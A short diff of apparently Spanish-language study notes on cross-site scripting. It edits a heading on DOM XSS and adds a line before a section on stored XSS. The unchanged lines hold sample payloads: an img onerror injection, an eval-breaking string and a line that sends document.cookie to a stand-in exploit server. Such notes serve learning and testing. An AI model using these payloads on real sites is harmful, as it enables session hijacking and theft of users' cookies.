@@ -37,11 +37,12 @@
 //html.replace('<', '&lt;').replace('>', '&gt;'); in a string, single occurrence Comment POST author vulnerable, revision del codigo JS que contiene un InnerHTML
 <><img src=x onerror=alert(1)>
 
-//More Elaborated DOM 
+//More Elaborated DOM (eval)
 \"}-alert(1)//
 "}; location="https://EXPLOIT-SERVER.net/c?"+document.cookie; //
 
 ```
+
 ### 3. XSS Stored: 
 
 Los scripts entre sitios almacenados (también conocidos como XSS de segundo orden o persistentes) surgen cuando una aplicación recibe datos de una fuente que no es confiable e incluye esos datos dentro de sus respuestas HTTP posteriores de manera insegura.
